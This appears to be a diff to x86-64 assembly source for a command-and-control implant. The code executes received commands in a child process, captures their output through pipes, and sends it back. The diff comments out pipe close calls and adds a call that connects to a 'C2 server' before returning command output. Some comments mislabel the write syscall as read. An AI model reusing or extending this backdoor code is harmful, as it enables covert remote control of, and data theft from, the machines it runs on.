@@ -85,7 +85,7 @@ fn_dbg_print_cmd_buffer:
 
     ; Write buffer to STDOUT
     mov rax, 0x1                    ; read syscall
-    mov rdi, 0x1                    ; socket file descriptor
+    mov rdi, 0x1                    ; STDOUT file descriptor
     lea rsi, [cmd_buffer]           ; pointer to the buffer
     mov rdx, [cmd_buffer_length]    ; buffer size
     syscall
@@ -159,7 +159,7 @@ fn_dbg_print_rx_buffer:
 
     ; Write buffer to STDOUT
     mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; socket file descriptor
+    mov rdi, 0x1                ; STDOUT file descriptor
     lea rsi, [rx_buffer]        ; pointer to the buffer
     mov rdx, 0x400              ; buffer size
     syscall
@@ -179,7 +179,7 @@ fn_dbg_print_tx_buffer:
 
     ; Write buffer to STDOUT
     mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; socket file descriptor
+    mov rdi, 0x1                ; STDOUT file descriptor
     lea rsi, [tx_buffer]        ; pointer to the buffer
     mov rdx, 0x400              ; buffer size
     syscall
@@ -367,9 +367,9 @@ fn_exec_cmd:
     mov r9, rax                 ; Save PID
 
     ; Close write pipe
-    mov rax, 0x3                ; close syscall
-    mov edi, dword [pipe_fd+4]
-    syscall
+    ;mov rax, 0x3                ; close syscall
+    ;mov edi, dword [pipe_fd+4]
+    ;syscall
 
     ; Wait for the child process to terminate
     mov rax, 0x3d               ; wait4 syscall
@@ -420,9 +420,9 @@ fn_exec_cmd:
 .child_process_branch:
 
     ; Close read pipe
-    mov rax, 0x3                ; close syscall
-    mov edi, dword [pipe_fd]
-    syscall
+    ;mov rax, 0x3                ; close syscall
+    ;mov edi, dword [pipe_fd]
+    ;syscall
 
     ; Use dup2 to redirect STDOUT to pipe
     ; After this call, execve output will be redirected to pipe
@@ -747,6 +747,9 @@ _start:
     mov rax, [cmd_buffer_length]        ; Copy buffer length
     mov [cmd_buffer_old_length], rax
 
+    ; Connection to C2 server
+    call fn_connect_client
+    
     ; Return output of command
     call fn_server_callback
 
